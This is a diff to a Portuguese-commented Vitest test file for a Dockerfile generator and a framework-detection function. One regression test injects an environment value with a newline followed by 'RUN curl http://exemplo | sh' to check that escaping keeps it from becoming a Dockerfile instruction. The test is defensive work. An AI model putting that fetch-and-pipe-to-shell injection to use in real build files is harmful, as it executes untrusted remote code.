@@ -2,6 +2,7 @@ import { describe, expect, it } from "vitest";
 
 import {
   buildImageFor,
+  detectarFrameworks,
   getLanguage,
   getStack,
   LANGUAGES,
@@ -158,9 +159,47 @@ describe("Dockerfile gerado", () => {
     expect(saida).toContain("WORKDIR /workspace/apps/web");
   });
 
-  it("sem comando de start não inventa CMD", () => {
+  it("valor com quebra de linha não escapa da instrução RUN", () => {
+    /*
+     * Sem isto, o `\n` encerrava o `RUN` e a segunda linha virava instrução
+     * Dockerfile por conta própria — o arquivo saía inválido, ou pior,
+     * carregando uma diretiva que ninguém escreveu ali.
+     */
+    const saida = generateDockerfile({
+      stack: getStack("nextjs")!,
+      buildCommand: "next build",
+      env: { CHAVE: "linha1\nRUN curl http://exemplo | sh" }
+    });
+    const runs = saida.split("\n").filter((linha) => linha.startsWith("RUN "));
+    expect(runs).toHaveLength(1);
+    expect(saida).not.toMatch(/^RUN curl/m);
+    expect(saida).toContain("export CHAVE='linha1 RUN curl http://exemplo | sh'");
+  });
+
+  it("PORT existe no runtime — o start das stacks que usam $PORT depende disso", () => {
+    // dotnet traz `ASPNETCORE_URLS=http://0.0.0.0:$PORT` no comando de start.
+    // Sem `ENV PORT`, o servidor subia escutando em ":" e morria na largada.
+    const saida = generateDockerfile({ stack: getStack("dotnet")!, buildCommand: "dotnet publish" });
+    expect(saida).toContain("ENV PORT=");
+    const porta = /ENV PORT=(\d+)/.exec(saida)?.[1];
+    expect(saida).toContain(`EXPOSE ${porta}`);
+    expect(saida).toContain("$PORT");
+  });
+
+  it("stack estática ganha servidor de arquivos, não uma imagem que não roda", () => {
+    // Vite/Angular/CRA constroem para uma pasta e não têm processo para subir.
+    // Antes o gerador não emitia CMD nenhum: `docker run` terminava na hora.
     const saida = generateDockerfile({ stack: getStack("vite")!, buildCommand: "vite build" });
-    expect(saida).not.toContain("CMD");
+    expect(saida).toContain("http-server dist -p $PORT -s");
+    // `-s` é o fallback para index.html: sem ele, recarregar uma rota de SPA
+    // que não seja a raiz devolve 404.
+    expect(saida).toMatch(/CMD \[/);
+  });
+
+  it("projeto com Dockerfile próprio não recebe um por cima", () => {
+    const saida = generateDockerfile({ stack: getStack("docker")! });
+    expect(saida).not.toMatch(/^CMD /m);
+    expect(saida).toContain("use o do repositório");
   });
 });
 
@@ -179,5 +218,102 @@ describe("marcas de progresso", () => {
     expect(progressForStep("install")).toBe(30);
     expect(progressForStep("install", "completed")).toBe(40);
     expect(progressForStep("passo-que-nao-existe")).toBe(0);
+  });
+});
+
+describe("detectarFrameworks", () => {
+  const pacote = (deps: Record<string, string>) =>
+    JSON.stringify({ name: "projeto", dependencies: deps });
+
+  it("Next.js ganha de Node.js no mesmo projeto", () => {
+    /*
+     * Os dois casam, e é assim em TODO projeto Node: o marcador de `node` é
+     * `package.json`. Quem responde "como isto sobe?" é o framework (a porta,
+     * a pasta de saída, o `next start`), não o "tem um package.json aqui".
+     *
+     * A stack `react` do port não entra nesta disputa porque não tem bloco
+     * `detection` nenhum — é entrada de escolha manual. Quem se identifica
+     * sozinho é o `cra`, pela dependência `react-scripts`.
+     */
+    const achados = detectarFrameworks({
+      arquivos: ["package.json", "next.config.js", "src/App.tsx"],
+      manifestos: { "package.json": pacote({ next: "15", react: "19" }) }
+    });
+    expect(achados[0].id).toBe("nextjs");
+    expect(achados[0].evidencia).toBe("next.config.js");
+    expect(achados.map((item) => item.id)).toContain("node");
+    expect(achados.findIndex((item) => item.id === "node")).toBeGreaterThan(0);
+  });
+
+  it("marcador sem barra precisa estar na RAIZ", () => {
+    // `index.html` dentro de `public/` é rotina em projeto React — tratar
+    // isso como site estático geraria a imagem errada.
+    const achados = detectarFrameworks({
+      arquivos: ["package.json", "public/index.html"],
+      manifestos: { "package.json": pacote({ react: "19", "react-scripts": "5" }) }
+    });
+    expect(achados.map((item) => item.id)).not.toContain("static");
+  });
+
+  it("marcador COM barra vale em qualquer nível", () => {
+    const achados = detectarFrameworks({ arquivos: ["backend/config/routes.rb", "Gemfile"] });
+    expect(achados.map((item) => item.id)).toContain("rails");
+  });
+
+  it("genéricas só aparecem quando nada específico casa", () => {
+    const soDocker = detectarFrameworks({ arquivos: ["Dockerfile", "README.md"] });
+    expect(soDocker.map((item) => item.id)).toEqual(["docker"]);
+
+    // Com framework de verdade no projeto, o Dockerfile deixa de ser resposta.
+    const comFramework = detectarFrameworks({
+      arquivos: ["Dockerfile", "package.json", "next.config.js"],
+      manifestos: { "package.json": pacote({ next: "15" }) }
+    });
+    expect(comFramework.map((item) => item.id)).not.toContain("docker");
+  });
+
+  it("projeto sem sinal nenhum devolve lista vazia", () => {
+    expect(detectarFrameworks({ arquivos: ["LEIAME.txt", "notas.md"] })).toEqual([]);
+  });
+
+  it("dependência é lida de manifesto que não é JSON", () => {
+    // pyproject.toml não é JSON e escrever um parser de TOML aqui seria
+    // desproporcional — o que importa é o nome aparecer declarado.
+    const achados = detectarFrameworks({
+      arquivos: ["pyproject.toml"],
+      manifestos: { "pyproject.toml": '[project]\ndependencies = ["fastapi>=0.110", "uvicorn"]\n' }
+    });
+    expect(achados.map((item) => item.id)).toContain("fastapi");
+  });
+
+  it("nome de dependência não casa como pedaço de outro", () => {
+    const achados = detectarFrameworks({
+      arquivos: ["pyproject.toml"],
+      manifestos: { "pyproject.toml": 'dependencies = ["django-extensions"]\n' }
+    });
+    // "django" está DENTRO de "django-extensions" — não é declaração de Django.
+    expect(achados.map((item) => item.id)).not.toContain("django");
+  });
+
+  it("manifesto quebrado não derruba a detecção pelos marcadores", () => {
+    const achados = detectarFrameworks({
+      arquivos: ["package.json", "next.config.js"],
+      manifestos: { "package.json": "{ isto não é json" }
+    });
+    expect(achados[0].id).toBe("nextjs");
+  });
+
+  it("o que sai serve direto para o Dockerfile", () => {
+    // É o ponto do módulo: a detecção alimenta o gerador sem tradução.
+    const [achado] = detectarFrameworks({
+      arquivos: ["package.json", "next.config.js"],
+      manifestos: { "package.json": pacote({ next: "15" }) }
+    });
+    const saida = generateDockerfile({
+      stack: achado.stack,
+      buildCommand: achado.stack.defaultBuildCommand
+    });
+    expect(saida).toContain(`EXPOSE ${achado.stack.defaultPort}`);
+    expect(saida).toContain("CMD [");
   });
 });
